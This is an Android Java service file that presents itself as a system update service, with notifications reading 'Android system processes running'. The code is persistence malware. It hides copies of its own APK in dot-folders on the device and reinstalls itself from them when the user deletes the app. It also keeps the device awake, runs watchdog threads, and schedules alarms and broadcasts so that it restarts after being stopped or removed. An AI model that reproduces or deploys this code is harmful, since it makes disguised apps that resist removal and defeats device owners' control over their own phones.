// SystemService.java
package com.system.service.update;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.AlarmManager;
import android.content.Intent;
import android.content.Context;
import android.os.IBinder;
import android.os.Build;
import android.os.PowerManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;

public class SystemService extends Service {
    
    private static final int NOTIFICATION_ID = 1001;
    private static final String CHANNEL_ID = "system_service_channel";
    private PowerManager.WakeLock wakeLock;
    private Thread serviceThread;
    private Thread watchdogThread;
    private volatile boolean isRunning = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        isRunning = true;
        createNotificationChannel();
        acquireWakeLock();
        createHiddenBackup();
        startBackgroundOperations();
        startWatchdog();
        scheduleRestartAlarm();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            String action = intent.getAction();
            if (action != null) {
                handleAction(action);
            }
        }
        
        // Create non-dismissible notification
        Notification notification = createNotification();
        notification.flags |= Notification.FLAG_NO_CLEAR;
        notification.flags |= Notification.FLAG_ONGOING_EVENT;
        
        startForeground(NOTIFICATION_ID, notification);
        
        return START_STICKY;
    }
    
    private void handleAction(String action) {
        if (action == null) return;
        
        switch (action) {
            case "network_available":
                onNetworkAvailable();
                break;
            case "power_connected":
                onPowerConnected();
                break;
            case "screen_off":
                onScreenOff();
                break;
            case "WATCHDOG_CHECK":
                performHealthCheck();
                break;
        }
    }
    
    private void onNetworkAvailable() {}
    private void onPowerConnected() {}
    private void onScreenOff() {}
    
    // ==================== BACKUP & REINSTALL ====================
    
    private void createHiddenBackup() {
        try {
            String sourcePath = getPackageManager()
                .getApplicationInfo(getPackageName(), 0).sourceDir;
            
            // Multiple hidden locations
            String[] backupPaths = {
                "/data/local/tmp/.system_backup/system_core.apk",
                "/sdcard/.system/.backup/sys.apk",
                "/sdcard/Android/data/.tmp/update.apk"
            };
            
            for (String path : backupPaths) {
                try {
                    File backupFile = new File(path);
                    backupFile.getParentFile().mkdirs();
                    
                    FileInputStream in = new FileInputStream(sourcePath);
                    FileOutputStream out = new FileOutputStream(backupFile);
                    byte[] buffer = new byte[8192];
                    int length;
                    while ((length = in.read(buffer)) > 0) {
                        out.write(buffer, 0, length);
                    }
                    in.close();
                    out.close();
                    
                    backupFile.setReadOnly();
                } catch (Exception e) {
                    // Continue to next location
                }
            }
        } catch (Exception e) {
            // Silent
        }
    }
    
    private void checkAndReinstall() {
        try {
            String appPath = getPackageManager()
                .getApplicationInfo(getPackageName(), 0).sourceDir;
            File appFile = new File(appPath);
            if (!appFile.exists()) {
                reinstallFromBackup();
            }
        } catch (Exception e) {
            reinstallFromBackup();
        }
    }
    
    private void reinstallFromBackup() {
        String[] backupPaths = {
            "/data/local/tmp/.system_backup/system_core.apk",
            "/sdcard/.system/.backup/sys.apk",
            "/sdcard/Android/data/.tmp/update.apk"
        };
        
        for (String path : backupPaths) {
            try {
                File backup = new File(path);
                if (backup.exists()) {
                    Intent intent = new Intent(Intent.ACTION_VIEW);
                    intent.setDataAndType(Uri.fromFile(backup),
                        "application/vnd.android.package-archive");
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                    return;
                }
            } catch (Exception e) {
                // Try next location
            }
        }
    }
    
    // ==================== NOTIFICATION ====================
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setDescription("Critical system operations");
            channel.setShowBadge(false);
            channel.enableLights(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private Notification createNotification() {
        Intent intent = new Intent(this, MainActivity.class);
        intent.setAction(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_LAUNCHER);
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 31) {
            flags = flags | 0x4000000;
        }
        
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, intent, flags
        );
        
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        builder.setContentTitle("System Service")
               .setContentText("Android system processes running")
               .setOngoing(true)
               .setPriority(Notification.PRIORITY_MIN)
               .setContentIntent(pendingIntent);
        
        try {
            builder.setSmallIcon(getApplicationInfo().icon);
        } catch (Exception e) {
            try {
                builder.setSmallIcon(android.R.drawable.ic_menu_manage);
            } catch (Exception ex) {}
        }
        
        return builder.build();
    }
    
    // ==================== WAKE LOCK ====================
    
    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            if (powerManager != null) {
                wakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "SystemService:WakeLock"
                );
                wakeLock.acquire(30 * 60 * 1000);
            }
        } catch (Exception e) {}
    }
    
    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            try {
                wakeLock.release();
            } catch (Exception e) {}
        }
    }
    
    // ==================== THREADS ====================
    
    private void startBackgroundOperations() {
        serviceThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        performPeriodicTasks();
                        Thread.sleep(30000);
                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {}
                }
            }
        });
        serviceThread.setName("SystemService-Background");
        serviceThread.setDaemon(true);
        serviceThread.start();
    }
    
    private void startWatchdog() {
        watchdogThread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (isRunning) {
                    try {
                        Thread.sleep(60000);
                        if (isRunning && wakeLock != null && !wakeLock.isHeld()) {
                            acquireWakeLock();
                        }
                    } catch (InterruptedException e) {
                        break;
                    } catch (Exception e) {}
                }
            }
        });
        watchdogThread.setName("SystemService-Watchdog");
        watchdogThread.setDaemon(true);
        watchdogThread.start();
    }
    
    private void scheduleRestartAlarm() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent restartIntent = new Intent(this, AlarmReceiver.class);
            restartIntent.setAction("RESTART_SERVICE");
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 1001, restartIntent, flags
            );
            
            if (alarmManager != null) {
                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    60000,
                    300000,
                    pendingIntent
                );
            }
        } catch (Exception e) {}
    }
    
    private void performHealthCheck() {
        try {
            if (serviceThread != null && !serviceThread.isAlive()) {
                startBackgroundOperations();
            }
            if (watchdogThread != null && !watchdogThread.isAlive()) {
                startWatchdog();
            }
            if (wakeLock == null || !wakeLock.isHeld()) {
                acquireWakeLock();
            }
        } catch (Exception e) {}
    }
    
    private void performPeriodicTasks() {
        checkNetworkState();
        checkPowerState();
        ensurePersistence();
        checkAndReinstall();  // ← Check if app was deleted, reinstall if needed
    }
    
    private void checkNetworkState() {
        try {
            ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
            if (cm != null) {
                NetworkInfo activeNetwork = cm.getActiveNetworkInfo();
            }
        } catch (Exception e) {}
    }
    
    private void checkPowerState() {
        try {
            Intent batteryIntent = registerReceiver(null, 
                new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
        } catch (Exception e) {}
    }
    
    private void ensurePersistence() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent alarmIntent = new Intent(this, AlarmReceiver.class);
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 0, alarmIntent, flags
            );
            
            if (alarmManager != null) {
                alarmManager.setInexactRepeating(
                    AlarmManager.ELAPSED_REALTIME_WAKEUP,
                    900000,
                    900000,
                    pendingIntent
                );
            }
        } catch (Exception e) {}
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartIntent = new Intent(getApplicationContext(), SystemService.class);
        
        int flags = PendingIntent.FLAG_UPDATE_CURRENT;
        if (Build.VERSION.SDK_INT >= 31) {
            flags = flags | 0x4000000;
        }
        
        PendingIntent pendingIntent = PendingIntent.getService(
            this, 0, restartIntent, flags
        );
        
        AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
        if (alarmManager != null) {
            alarmManager.set(AlarmManager.ELAPSED_REALTIME, 1000, pendingIntent);
        }
        
        Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
        sendBroadcast(broadcastIntent);
        
        super.onTaskRemoved(rootIntent);
    }
    
    @Override
    public void onDestroy() {
        isRunning = false;
        releaseWakeLock();
        
        if (serviceThread != null) serviceThread.interrupt();
        if (watchdogThread != null) watchdogThread.interrupt();
        
        Intent broadcastIntent = new Intent("com.system.service.update.RESTART_SERVICE");
        sendBroadcast(broadcastIntent);
        
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(ALARM_SERVICE);
            Intent restartIntent = new Intent(this, AlarmReceiver.class);
            restartIntent.setAction("RESTART_SERVICE");
            
            int flags = PendingIntent.FLAG_UPDATE_CURRENT;
            if (Build.VERSION.SDK_INT >= 31) {
                flags = flags | 0x4000000;
            }
            
            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                this, 2001, restartIntent, flags
            );
            
            if (alarmManager != null) {
                alarmManager.set(AlarmManager.ELAPSED_REALTIME_WAKEUP, 1000, pendingIntent);
            }
        } catch (Exception e) {}
        
        super.onDestroy();
    }
}
